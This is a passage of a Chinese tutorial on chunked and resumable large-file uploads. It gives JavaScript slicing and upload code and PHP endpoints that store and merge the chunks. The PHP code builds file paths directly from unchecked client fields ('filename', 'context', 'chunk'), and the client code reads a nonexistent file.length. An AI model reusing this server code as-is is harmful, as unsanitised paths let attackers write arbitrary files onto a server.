punctuation\">)</span>\n\n    <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"#\"</span><span class=\"token operator\">+</span>id<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">on</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"load\"</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">var</span> content <span class=\"token operator\">=</span> <span class=\"token function\">$</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">contents</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">find</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"body\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">text</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">var</span> data <span class=\"token operator\">=</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><strong>扩展：</strong></p>\n<p><strong>大文件上传</strong></p>\n<p>现在来看看在上面提到的几种上传方式中实现大文件上传会遇见的超时问题，</p>\n<ul>\n<li>表单上传和iframe无刷新页面上传，实际上都是通过form标签进行上传文件，这种方式将整个请求完全交给浏览器处理，当上传大文件时，可能会遇见请求超时的情形</li>\n<li>通过fromData，其实际也是在xhr中封装一组请求参数，用来模拟表单请求，无法避免大文件上传超时的问题</li>\n<li>编码上传，我们可以比较灵活地控制上传的内容</li>\n</ul>\n<p>大文件上传最主要的问题就在于：<strong>在同一个请求中，要上传大量的数据，导致整个过程会比较漫长，且失败后需要重头开始上传</strong>。试想，如果我们将这个请求拆分成多个请求，每个请求的时间就会缩短，且如果某个请求失败，只需要重新发送这一次请求即可，无需从头开始，这样是否可以解决大文件上传的问题呢？</p>\n<p>综合上面的问题，看来大文件上传需要实现下面几个需求</p>\n<ul>\n<li>支持拆分上传请求(即切片)</li>\n<li>支持断点续传</li>\n<li>支持显示上传进度和暂停上传</li>\n</ul>\n<p>接下来让我们依次实现这些功能，看起来最主要的功能应该就是切片了。</p>\n<p><strong>文件切片</strong></p>\n<p>编码方式上传中，在前端我们只要先获取文件的二进制内容，然后对其内容进行拆分，最后将每个切片上传到服务端即可。</p>\n<p>在JavaScript中，文件FIle对象是Blob对象的子类，Blob对象包含一个重要的方法slice，通过这个方法，我们就可以对二进制文件进行拆分。</p>\n<p>下面是一个拆分文件的示例</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">function</span> <span class=\"token function\">slice</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">file<span class=\"token punctuation\">,</span> piece <span class=\"token operator\">=</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">5</span></span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">let</span> totalSize <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 文件总大小</span>\n <span class=\"token keyword\">let</span> start <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 每次上传的开始字节</span>\n <span class=\"token keyword\">let</span> end <span class=\"token operator\">=</span> start <span class=\"token operator\">+</span> piece<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 每次上传的结尾字节</span>\n <span class=\"token keyword\">let</span> chunks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>start <span class=\"token operator\">&lt;</span> totalSize<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token comment\">// 根据长度截取每次需要上传的数据</span>\n <span class=\"token comment\">// File对象继承自Blob对象，因此包含slice方法</span>\n <span class=\"token keyword\">let</span> blob <span class=\"token operator\">=</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">(</span>start<span class=\"token punctuation\">,</span> end<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> \n chunks<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>blob<span class=\"token punctuation\">)</span>\n start <span class=\"token operator\">=</span> end<span class=\"token punctuation\">;</span>\n end <span class=\"token operator\">=</span> start <span class=\"token operator\">+</span> piece<span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token keyword\">return</span> chunks\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>将文件拆分成piece大小的分块，然后每次请求只需要上传这一个部分的分块即可</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> file <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[name=file]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">LENGTH</span> <span class=\"token operator\">=</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">0.1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> chunks <span class=\"token operator\">=</span> <span class=\"token function\">slice</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">,</span> <span class=\"token constant\">LENGTH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 首先拆分切片</span>\nchunks<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">chunk</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">let</span> fd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FormData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">,</span> chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/mkblk.php'</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>服务器接收到这些切片后，再将他们拼接起来就可以了，下面是PHP拼接切片的示例代码</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">$filename <span class=\"token operator\">=</span> <span class=\"token string\">'./upload/'</span> <span class=\"token punctuation\">.</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'filename'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//确定上传的文件名</span>\n<span class=\"token comment\">//第一次上传时没有文件，就创建文件，此后上传只需要把数据追加到此文件中</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span>$filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span>$_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>$filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span>$filename<span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span>$_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n echo $filename<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>测试时记得修改nginx的server配置，否则大文件可能会提示413 Request Entity Too Large的错误。</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\">server <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">// ...</span>\n  client_max_body_size 50m<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>上面这种方式来存在一些问题</p>\n<ul>\n<li>无法识别一个切片是属于哪一个切片的，当同时发生多个请求时，追加的文件内容会出错</li>\n<li>切片上传接口是异步的，无法保证服务器接收到的切片是按照请求顺序拼接的</li>\n</ul>\n<p>因此接下来我们来看看应该如何在服务端还原切片。</p>\n<p><strong>还原切片</strong></p>\n<p>在后端需要将多个相同文件的切片还原成一个文件，上面这种处理切片的做法存在下面几个问题</p>\n<ul>\n<li>如何识别多个切片是来自于同一个文件的，这个可以在每个切片请求上传递一个相同文件的context参数</li>\n<li>如何将多个切片还原成一个文件</li>\n<li>确认所有切片都已上传，这个可以通过客户端在切片全部上传后调用mkfile接口来通知服务端进行拼接</li>\n<li>找到同一个context下的所有切片，确认每个切片的顺序，这个可以在每个切片上标记一个位置索引值</li>\n<li>按顺序拼接切片，还原成文件</li>\n</ul>\n<p>上面有一个重要的参数，即context，我们需要获取为一个文件的唯一标识，可以通过下面两种方式获取</p>\n<ul>\n<li>根据文件名、文件长度等基本信息进行拼接，为了避免多个用户上传相同的文件，可以再额外拼接用户信息如uid等保证唯一性</li>\n<li>根据文件的二进制内容计算文件的hash，这样只要文件内容不一样，则标识也会不一样，缺点在于计算量比较大.</li>\n</ul>\n<p>修改上传代码，增加相关参数</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 获取context，同一个文件会返回相同的值</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">createContext</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">file</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> file<span class=\"token punctuation\">.</span>name <span class=\"token operator\">+</span> file<span class=\"token punctuation\">.</span>length\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">let</span> file <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[name=file]\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>files<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">const</span> <span class=\"token constant\">LENGTH</span> <span class=\"token operator\">=</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">1024</span> <span class=\"token operator\">*</span> <span class=\"token number\">0.1</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> chunks <span class=\"token operator\">=</span> <span class=\"token function\">slice</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">,</span> <span class=\"token constant\">LENGTH</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 获取对于同一个文件，获取其的context</span>\n<span class=\"token keyword\">let</span> context <span class=\"token operator\">=</span> <span class=\"token function\">createContext</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nchunks<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">chunk<span class=\"token punctuation\">,</span> index</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">let</span> fd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FormData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">,</span> chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">// 传递context</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">,</span> context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token comment\">// 传递切片索引值</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chunk\"</span><span class=\"token punctuation\">,</span> index <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n tasks<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mkblk.php\"</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 所有切片上传完毕后，调用mkfile接口</span>\nPromise<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span>tasks<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">let</span> fd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FormData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">,</span> context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chunks\"</span><span class=\"token punctuation\">,</span> chunks<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token function\">post</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mkfile.php\"</span><span class=\"token punctuation\">,</span> fd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">res</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在mkblk.php接口中，我们通过context来保存同一个文件相关的切片</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// mkblk.php</span>\n$context <span class=\"token operator\">=</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'context'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$path <span class=\"token operator\">=</span> <span class=\"token string\">'./upload/'</span> <span class=\"token punctuation\">.</span> $context<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span>$path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token function\">mkdir</span><span class=\"token punctuation\">(</span>$path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 把同一个文件的切片放在相同的目录下</span>\n$filename <span class=\"token operator\">=</span> $path <span class=\"token punctuation\">.</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">.</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'chunk'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$res <span class=\"token operator\">=</span> <span class=\"token function\">move_uploaded_file</span><span class=\"token punctuation\">(</span>$_FILES<span class=\"token punctuation\">[</span><span class=\"token string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>$filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>除了上面这种简单通过目录区分切片的方法之外，还可以将切片信息保存在数据库来进行索引。接下来是mkfile.php接口的实现，这个接口会在所有切片上传后调用</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// mkfile.php</span>\n$context <span class=\"token operator\">=</span> $_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'context'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n$chunks <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>int<span class=\"token punctuation\">)</span>$_POST<span class=\"token punctuation\">[</span><span class=\"token string\">'chunks'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//合并后的文件名</span>\n$filename <span class=\"token operator\">=</span> <span class=\"token string\">'./upload/'</span> <span class=\"token punctuation\">.</span> $context <span class=\"token punctuation\">.</span> <span class=\"token string\">'/file.jpg'</span><span class=\"token punctuation\">;</span> \n<span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span>$i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> $i <span class=\"token operator\">&lt;=</span> $chunks<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>$i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n $file <span class=\"token operator\">=</span> <span class=\"token string\">'./upload/'</span><span class=\"token punctuation\">.</span>$context<span class=\"token punctuation\">.</span> <span class=\"token string\">'/'</span> <span class=\"token punctuation\">.</span>$i<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 读取单个切块</span>\n $content <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span>$file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span>$filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n $fd <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span>$filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"w+\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n $fd <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span>$filename<span class=\"token punctuation\">,</span> <span class=\"token string\">\"a\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token punctuation\">&#125;</span>\n <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span>$fd<span class=\"token punctuation\">,</span> $content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 将切块合并到一个文件上</span>\n<span class=\"token punctuation\">&#125;</span>\necho $filename<span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>这样就解决了上面的两个问题：</p>\n<ul>\n<li>识别切片来源</li>\n<li>保证切片拼接顺序</li>\n</ul>\n<p><strong>断点续传</strong></p>\n<p>即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过<strong>断点续传</strong>来进行处理。</p>\n<p>断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。</p>\n<p>由于整个上传过程是按切片维度进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：</p>\n<ul>\n<li>在切片上传成功后，保存已上传的切片信息</li>\n<li>当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传</li>\n<li>所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并</li>\n</ul>\n<p>因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略</p>\n<ul>\n<li>可以通过locaStorage等方式保存在前端浏览器中，这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失</li>\n<li>服务端本身知道哪些切片已经上传，因此可以由服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录</li>\n</ul>\n<p>下面让我们通过在本地保存已上传切片记录，来实现断点上传的功能</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 获取已上传切片记录</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">getUploadSliceRecord</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">context</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">let</span> record <span class=\"token operator\">=</span> localStorage<span class=\"token punctuation\">.</span><span class=\"token function\">getItem</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>record<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">try</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">return</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">parse</span><span class=\"token punctuation\">(</span>record<span class=\"token punctuation\">)</span>\n <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">catch</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// 保存已上传切片</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">saveUploadSliceRecord</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">context<span class=\"token punctuation\">,</span> sliceIndex</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">let</span> list <span class=\"token operator\">=</span> <span class=\"token function\">getUploadSliceRecord</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span>\n list<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>sliceIndex<span class=\"token punctuation\">)</span>\n localStorage<span class=\"token punctuation\">.</span><span class=\"token function\">setItem</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">,</span> <span class=\"token constant\">JSON</span><span class=\"token punctuation\">.</span><span class=\"token function\">stringify</span><span class=\"token punctuation\">(</span>list<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>然后对上传逻辑稍作修改，主要是增加上传前检测是已经上传、上传后保存记录的逻辑</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> context <span class=\"token operator\">=</span> <span class=\"token function\">createContext</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">// 获取上传记录</span>\n<span class=\"token keyword\">let</span> record <span class=\"token operator\">=</span> <span class=\"token function\">getUploadSliceRecord</span><span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">let</span> tasks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nchunks<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">chunk<span class=\"token punctuation\">,</span> index</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n <span class=\"token comment\">// 已上传的切片则不再重新上传</span>\n <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>record<span class=\"token punctuation\">.</span><span class=\"token function\">includes</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n <span class=\"token keyword\">return</span>\n <span class=\"token punctuation\">&#125;</span>\n\n <span class=\"token keyword\">let</span> fd <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FormData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file\"</span><span class=\"token punctuation\">,</span> chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"context\"</span><span class=\"token punctuation\">,</span> context<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n fd<span class=\"token punctuation\">.</span><span class=\"token function\">append</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"chunk\"</span><span class=\"token punctuation\">,</span> index <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n <span class=\"token 